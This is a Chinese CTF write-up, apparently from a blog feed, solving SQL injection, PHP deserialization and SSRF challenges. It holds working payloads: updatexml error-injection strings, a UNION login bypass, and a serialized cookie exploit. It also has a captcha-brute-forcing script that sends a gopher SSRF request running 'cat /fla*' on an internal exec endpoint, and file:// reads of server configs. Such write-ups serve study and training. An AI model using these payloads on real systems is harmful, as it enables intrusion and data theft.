    <content type="html"><![CDATA[<h1 id="序"><a href="#序" class="headerlink" title="序"></a>序</h1><p>补一下，11月份的比赛，太忙一直没时间更新</p><h3 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h3><p>很明显的注入，但是过滤了一些关键字，比如information、sys等，导致获取不到表名</p><p>通过：</p><pre><code>uname=1&apos;) and updatexml(1,concat(0x3a,(select * from flag)),1);-- -&amp;passwd=1</code></pre><p>可以发现存在名为flag表，并且可以获取到里面的数据</p><p><img src="http://pic.c1imber.top/blog/20201207/ATMFj13IU8MU.png?imageslim" alt="mark"></p><p>但是updatexml这种报错注入方式显示的信息有长度限制，而且这里不知道flag表当中flag的列名，关于无列名注入的问题，直接用子查询就能绕过</p><p>获取完整的flag:</p><pre><code>uname=1&apos;) and updatexml(1,concat(0x3a,(select x.1 from (select * from (select 1)a union select * from flag limit 1,1)x)),1);-- -&amp;passwd=1</code></pre><p><img src="http://pic.c1imber.top/blog/20201207/mt78Vtm8W73S.png?imageslim" alt="mark"></p><pre><code>uname=1&apos;) and updatexml(1,concat(0x3a,(select substr(x.1,32) from (select * from (select 1)a union select * from flag limit 1,1)x)),1);-- -&amp;passwd=1</code></pre><p><img src="http://pic.c1imber.top/blog/20201207/AkK4A2mQk6U5.png?imageslim" alt="mark"></p><p>拼接获得完整的flag:</p><p>flag{c7651cb673c911ee8f9977094a220f17}</p><h3 id="ezsqli"><a href="#ezsqli" class="headerlink" title="ezsqli"></a>ezsqli</h3><p>通过<a href="http://121.36.224.156:2333/?hint可以查看提示的代码" target="_blank" rel="external">http://121.36.224.156:2333/?hint可以查看提示的代码</a>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"> <span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//a "part" of the source code here  </span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqlWaf</span><span class="params">($s)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    $filter = <span class="string">'/xml|extractvalue|regexp|copy|read|file|select|between|from|where|create|grand|dir|insert|link|substr|mid|server|drop|=|&gt;|&lt;|;|"|\^|\||\ |\'/i'</span>;</div><div class="line">    <span class="keyword">if</span> (preg_match($filter,$s))</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span>;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">True</span>;</div><div class="line">&#125;   </div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'VerifyCode'</span>]))</div><div class="line">            <span class="keyword">die</span>(<span class="string">"?"</span>);   </div><div class="line"></div><div class="line">    $username = strval($_POST[<span class="string">'username'</span>]);</div><div class="line">    $password = strval($_POST[<span class="string">'password'</span>]); </div><div class="line"></div><div class="line">    <span class="keyword">if</span> ( !sqlWaf($password) )</div><div class="line">        alertMes(<span class="string">'damn hacker'</span> ,<span class="string">"./index.php"</span>); </div><div class="line"></div><div class="line">    $sql = <span class="string">"SELECT * FROM users WHERE username='$&#123;username&#125;' AND password= '$&#123;password&#125;'"</span>;</div><div class="line"><span class="comment">//    password format: /[A-Za-z0-9]/</span></div><div class="line">    $result = $conn-&gt;query($sql);</div><div class="line">    <span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</div><div class="line">        $row = $result-&gt;fetch_assoc();</div><div class="line">        <span class="keyword">if</span> ( $row[<span class="string">'username'</span>] === <span class="string">'admin'</span> &amp;&amp; $row[<span class="string">'password'</span>] )</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span> ($row[<span class="string">'password'</span>] == $password)</div><div class="line">            &#123;</div><div class="line">                $message = $FLAG;</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                $message = <span class="string">"username or password wrong, are you admin?"</span>;</div><div class="line">            &#125;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            $message = <span class="string">"wrong user"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $message = <span class="string">"user not exist or wrong password"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;   </div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>查看代码，看到存在<code>sqlWaf</code>函数，该waf函数只对<code>$_POST[password]</code>参数做了检测</p><p>通过代码还能看到获取flag的条件，需要<code>SELECT * FROM users WHERE username=&#39;$_POST[username]&#39; AND password= &#39;$_POST[password]&#39;</code>查询出的<code>$row[&#39;username&#39;]</code>为admin，并且<code>$row[&#39;password&#39;]</code>等于<code>$_POST[password]</code></p><p>这里构造</p><pre><code>username=&apos; union select 1,&quot;admin&quot;,&quot;1&quot;-- -&amp;password=1&amp;captcha=图形验证码</code></pre><p>就可以满足要求，此时sql执行的结果为：<code>$row[&#39;username&#39;]</code>为admin，<code>$row[&#39;password&#39;]</code>为1，<code>$row[&#39;password&#39;]</code>和<code>$_POST[&#39;password&#39;]</code>相等</p><p><img src="http://pic.c1imber.top/blog/20201207/QRBQRHCj6uG8.png?imageslim" alt="mark"></p><p>获取到flag：</p><p>flag{de3110dce011088cd4add1950a49182f}</p><h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><p>打开后是index.php是一个登录页面</p><p><img src="http://pic.c1imber.top/blog/20201207/rn7W3RlFz1h3.png?imageslim" alt="mark"></p><p>根据题目提示下载源码进行简单的审计</p><p>index.php 131-132行</p><p>通过addslashes函数对传入的<code>$_POST[&#39;username&#39;]</code>和<code>$_POST[&#39;password&#39;]</code>进行了处理，防止了sql注入</p><p><img src="http://pic.c1imber.top/blog/20201207/6fSWU2JqwsiC.png?imageslim" alt="mark"></p><p>但是看conn.php当中有可能存在反序列化漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>; </div><div class="line"></div><div class="line"> <span class="class"><span class="keyword">class</span> <span class="title">SQL</span> </span>&#123;</div><div class="line">    <span class="keyword">public</span> $table = <span class="string">''</span>;</div><div class="line">    <span class="keyword">public</span> $username = <span class="string">''</span>;</div><div class="line">    <span class="keyword">public</span> $password = <span class="string">''</span>;</div><div class="line">    <span class="keyword">public</span> $conn;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;conn = <span class="keyword">new</span> mysqli(<span class="string">"localhost"</span>, <span class="string">"xxxxx"</span>, <span class="string">"xxxx"</span>, <span class="string">"xxxx"</span>);</div><div class="line">    &#125;   </div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_login</span><span class="params">()</span></span>&#123;</div><div class="line">        $result = <span class="keyword">$this</span>-&gt;query();</div><div class="line">        <span class="keyword">if</span> ($result === <span class="keyword">false</span>) &#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">"database error, please check your input"</span>);</div><div class="line">        &#125;</div><div class="line">        $row = $result-&gt;fetch_assoc();</div><div class="line">        <span class="keyword">if</span>($row === <span class="keyword">NULL</span>)&#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">"username or password incorrect!"</span>);</div><div class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($row[<span class="string">'username'</span>] === <span class="string">'admin'</span>)&#123;</div><div class="line">            $flag = file_get_contents(<span class="string">'flag.php'</span>);</div><div class="line">            <span class="keyword">echo</span> <span class="string">"welcome, admin! this is your flag -&gt; "</span>.$flag;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"welcome! but you are not admin"</span>;</div><div class="line">        &#125;</div><div class="line">        $result-&gt;free();</div><div class="line">    &#125;   </div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;waf();</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;conn-&gt;query (<span class="string">"select username,password from "</span>.<span class="keyword">$this</span>-&gt;table.<span class="string">" where username='"</span>.<span class="keyword">$this</span>-&gt;username.<span class="string">"' and password='"</span>.<span class="keyword">$this</span>-&gt;password.<span class="string">"'"</span>);</div><div class="line">    &#125;   </div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">()</span></span>&#123;</div><div class="line">        $blacklist = [<span class="string">"union"</span>, <span class="string">"join"</span>, <span class="string">"!"</span>, <span class="string">"\""</span>, <span class="string">"#"</span>, <span class="string">"$"</span>, <span class="string">"%"</span>, <span class="string">"&amp;"</span>, <span class="string">"."</span>, <span class="string">"/"</span>, <span class="string">":"</span>, <span class="string">";"</span>, <span class="string">"^"</span>, <span class="string">"_"</span>, <span class="string">"`"</span>, <span class="string">"&#123;"</span>, <span class="string">"|"</span>, <span class="string">"&#125;"</span>, <span class="string">"&lt;"</span>, <span class="string">"&gt;"</span>, <span class="string">"?"</span>, <span class="string">"@"</span>, <span class="string">"["</span>, <span class="string">"\\"</span>, <span class="string">"]"</span> , <span class="string">"*"</span>, <span class="string">"+"</span>, <span class="string">"-"</span>];</div><div class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $value) &#123;</div><div class="line">            <span class="keyword">if</span>(strripos(<span class="keyword">$this</span>-&gt;table, $value))&#123;</div><div class="line">                <span class="keyword">die</span>(<span class="string">'bad hacker,go out!'</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $value) &#123;</div><div class="line">            <span class="keyword">if</span>(strripos(<span class="keyword">$this</span>-&gt;username, $value))&#123;</div><div class="line">                <span class="keyword">die</span>(<span class="string">'bad hacker,go out!'</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $value) &#123;</div><div class="line">            <span class="keyword">if</span>(strripos(<span class="keyword">$this</span>-&gt;password, $value))&#123;</div><div class="line">                <span class="keyword">die</span>(<span class="string">'bad hacker,go out!'</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;   </div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span> (<span class="keyword">$this</span>-&gt;conn)) &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;connect ();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;table)&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;waf();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">$this</span>-&gt;check_login();</div><div class="line">        <span class="keyword">$this</span>-&gt;conn-&gt;close();</div><div class="line">    &#125;   </div><div class="line"></div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>而在index.php第115行：<code>$last_login_info = unserialize (base64_decode ($_COOKIE[&#39;last_login_info&#39;]));</code>这段代码刚好可以触发<code>SQL类</code>的<code>__wakeup</code>函数，造成反序列化漏洞，导致<code>SQL类</code>当中的属性可控</p><p>SQL类当中的waf过滤了很多字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$blacklist = [<span class="string">"union"</span>, <span class="string">"join"</span>, <span class="string">"!"</span>, <span class="string">"\""</span>, <span class="string">"#"</span>, <span class="string">"$"</span>, <span class="string">"%"</span>, <span class="string">"&amp;"</span>, <span class="string">"."</span>, <span class="string">"/"</span>, <span class="string">":"</span>, <span class="string">";"</span>, <span class="string">"^"</span>, <span class="string">"_"</span>, <span class="string">"`"</span>, <span class="string">"&#123;"</span>, <span class="string">"|"</span>, <span class="string">"&#125;"</span>, <span class="string">"&lt;"</span>, <span class="string">"&gt;"</span>, <span class="string">"?"</span>, <span class="string">"@"</span>, <span class="string">"["</span>, <span class="string">"\\"</span>, <span class="string">"]"</span> , <span class="string">"*"</span>, <span class="string">"+"</span>, <span class="string">"-"</span>];</div></pre></td></tr></table></figure><p>但是没有过滤单引号，于是构造出poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">SQL</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"> <span class="keyword">public</span> $table=<span class="string">"users"</span>;</div><div class="line"> <span class="keyword">public</span> $username=<span class="string">"' or '1"</span>;</div><div class="line"> <span class="keyword">public</span> $password=<span class="string">"' or '1"</span>;  </div><div class="line">&#125;   </div><div class="line"></div><div class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> SQL()));</div></pre></td></tr></table></figure><p>获得：</p><pre><code>TzozOiJTUUwiOjM6e3M6NToidGFibGUiO3M6NToidXNlcnMiO3M6ODoidXNlcm5hbWUiO3M6NzoiJyBvciAnMSI7czo4OiJwYXNzd29yZCI7czo3OiInIG9yICcxIjt9</code></pre><p>访问index.php，传入</p><pre><code>Cookie: last_login_info=TzozOiJTUUwiOjM6e3M6NToidGFibGUiO3M6NToidXNlcnMiO3M6ODoidXNlcm5hbWUiO3M6NzoiJyBvciAnMSI7czo4OiJwYXNzd29yZCI7czo3OiInIG9yICcxIjt9</code></pre><p>获取到flag</p><p>flag{5dd2d5f45fw6e6f11ewf1f224f5121e2}</p><p><img src="http://pic.c1imber.top/blog/20201207/8kpluRrm76mM.png?imageslim" alt="mark"></p><h3 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h3><p>比赛时没做出来，说一下当时的思路</p><p>首先file协议读了源码：</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">session_start();</div><div class="line"><span class="keyword">require_once</span> <span class="string">"lib.php"</span>;</div><div class="line">init(); </div><div class="line"></div><div class="line">$is_die = <span class="number">0</span>;</div><div class="line">$is_post = <span class="number">0</span>;</div><div class="line">$die_mess = <span class="string">''</span>;</div><div class="line">$url = <span class="string">''</span>;  </div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'captcha'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'url'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'captcha'</span>]))</div><div class="line">&#123;</div><div class="line">    $url = $_POST[<span class="string">'url'</span>];</div><div class="line">    $captcha = $_POST[<span class="string">'captcha'</span>];</div><div class="line">    $is_post = <span class="number">1</span>;</div><div class="line">    <span class="keyword">if</span> ( $captcha !== $_SESSION[<span class="string">'answer'</span>])</div><div class="line">    &#123;</div><div class="line">        $die_mess = <span class="string">"wrong captcha"</span>;</div><div class="line">        $is_die = <span class="number">1</span>;</div><div class="line">    &#125;   </div><div class="line"></div><div class="line">    <span class="keyword">if</span> ( preg_match(<span class="string">'/flag|proc|log/i'</span>, $url) )</div><div class="line">    &#123;</div><div class="line">        $die_mess = <span class="string">"hacker"</span>;</div><div class="line">        $is_die = <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">&#125;   </div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>可以看到过滤了flag，其实这里直接url编码一次就可以绕过了，当时没想到这点，感觉这样解应该算是非预期了</p><p>lib.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">session_start();</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</div><div class="line">    $ch = curl_init();</div><div class="line">    curl_setopt($ch, CURLOPT_URL, $url);</div><div class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">FALSE</span>);</div><div class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="keyword">FALSE</span>);</div><div class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</div><div class="line">    $output = curl_exec($ch);</div><div class="line">    curl_close($ch);</div><div class="line">    <span class="keyword">return</span> $output;</div><div class="line">&#125;   </div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_session</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    $answer = rand(<span class="number">1</span>,<span class="number">100000</span>);</div><div class="line">    $_SESSION[<span class="string">'captcha'</span>] = substr(md5($answer),<span class="number">-6</span>,<span class="number">6</span>);</div><div class="line">    $_SESSION[<span class="string">'answer'</span>] = strval($answer);</div><div class="line">&#125;   </div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">destroy_session</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    $_SESSION = [];</div><div class="line">&#125;   </div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'captcha'</span>]) || !<span class="keyword">isset</span>($_SESSION[<span class="string">'answer'</span>]) || <span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>]))</div><div class="line">    &#123;</div><div class="line">        destroy_session();</div><div class="line">        set_session();</div><div class="line">        <span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>]) ? <span class="keyword">die</span>(<span class="string">"&lt;script&gt;location.href='./index.php'&lt;/script&gt;"</span>) : <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>正常的请求读取代码，存在ssrf</p><p>端口扫描脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"><span class="keyword">import</span> requests </div><div class="line"></div><div class="line"><span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">8080</span>,<span class="number">65535</span>):</div><div class="line">    session = requests.Session()</div><div class="line">    url=<span class="string">"http://124.71.187.100:8079/index.php"</span></div><div class="line">    headers = &#123;<span class="string">"Origin"</span>:<span class="string">"http://124.71.187.100:8079"</span>,<span class="string">"Accept"</span>:<span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span>,<span class="string">"Upgrade-Insecure-Requests"</span>:<span class="string">"1"</span>,<span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0"</span>,<span class="string">"Connection"</span>:<span class="string">"close"</span>,<span class="string">"Referer"</span>:<span class="string">"http://124.71.187.100:8079/index.php"</span>,<span class="string">"Accept-Language"</span>:<span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,<span class="string">"Accept-Encoding"</span>:<span class="string">"gzip, deflate"</span>,<span class="string">"Content-Type"</span>:<span class="string">"application/x-www-form-urlencoded"</span>&#125;</div><div class="line">    res=session.get(url,headers=headers).text</div><div class="line">    code=res.split(<span class="string">'== "'</span>)[<span class="number">1</span>].split(<span class="string">'"'</span>)[<span class="number">0</span>]</div><div class="line">    <span class="comment">#print code</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100000</span>):</div><div class="line">        <span class="keyword">if</span> hashlib.md5(str(i)).hexdigest()[<span class="number">-6</span>:]==code:</div><div class="line">            <span class="comment">#print i</span></div><div class="line">            <span class="comment">#paramsPost = &#123;"captcha":"&#123;&#125;".format(i),"url":"file:///var/www/htmlssrf123123/index.php"&#125;</span></div><div class="line">            paramsPost = &#123;<span class="string">"captcha"</span>:<span class="string">"&#123;&#125;"</span>.format(i),<span class="string">"url"</span>:<span class="string">"gopher://127.0.0.1:47852/_POST%2520%252Findex.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A47852%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252013%250D%250A%250D%250Acmd%253Dcat%2520%252Ffla%252A%250A"</span>&#125;</div><div class="line">            response = session.post(<span class="string">"http://124.71.187.100:8079/index.php"</span>, data=paramsPost)</div><div class="line">            <span class="keyword">print</span> response.text</div><div class="line">            <span class="keyword">if</span> len(response.text)!=<span class="number">1046</span>:</div><div class="line">                <span class="keyword">if</span> <span class="string">"wrong captcha"</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</div><div class="line">                    <span class="comment">#print str(port)+"\n"</span></div><div class="line">                    <span class="comment">#print response.text</span></div><div class="line">                    <span class="keyword">break</span></div><div class="line">    <span class="keyword">break</span></div></pre></td></tr></table></figure><p>跑了一遍，很慢，啥也扫不到</p><p>换个思路，因为目前可以读文件，所以先信息搜集一下，读取apache配置文件：<code>file:///etc/apache2/sites-enabled/000-default.conf</code></p><pre><code>&lt;VirtualHost *:80&gt;        ServerAdmin webmaster@localhost        DocumentRoot /var/www/html        ErrorLog ${APACHE_LOG_DIR}/error.log        CustomLog ${APACHE_LOG_DIR}/access.log combined&lt;/VirtualHost&gt;  &lt;VirtualHost *:47852&gt;        ServerAdmin secret@localhost        DocumentRoot /var/www/htmlssrf123123        ErrorLog ${APACHE_LOG_DIR}/error.log        CustomLog ${APACHE_LOG_DIR}/access.log combined&lt;/VirtualHost&gt;</code></pre><p>读取源码:<code>file:///var/www/htmlssrf123123/index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">        <span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'cmd'</span>]))&#123;</div><div class="line">        exec($_POST[<span class="string">'cmd'</span>]);</div><div class="line">    &#125;</div><div class="line"><span class="meta">?&gt;</span>    &lt;/div&gt;</div></pre></td></tr></table></figure><p>由于exec函数没有回显，所以只能通过反弹shell（不出网）、写入文件（/tmp目录都写不进去）、延时盲注（sleep 5存在延时）进行回显，但是前两种方法均一直不能成功,看了好几篇wp也都是二次url编码的非预期解，不知道是不是题目有问题。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;序&quot;&gt;&lt;a href=&quot;#序&quot; class=&quot;headerlink&quot; title=&quot;序&quot;&gt;&lt;/a&gt;序&lt;/h1&gt;&lt;p&gt;补一下，11月份的比赛，太忙一直没时间更新&lt;/p&gt;
&lt;h3 id=&quot;easy-sql&quot;&gt;&lt;a href=&quot;#easy-sql&quot; class=&quot;hea
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>weblogic cve-2020-14882 漏洞复现以及回显方式研究</title>
    <link href="https://c1aysec.github.io/2020/11/02/weblogic%20cve-2020-14882%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%BB%A5%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F%E7%A0%94%E7%A9%B6/"/>
    <id>https://c1aysec.github.io/2020/11/02/weblogic cve-2020-14882 漏洞复现以及回显方式研究/</id>
    <published>2020-11-01T16:13:48.426Z</published>
    <updated>2020-11-02T02:48:36.688Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="Hey, password is required here." />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" 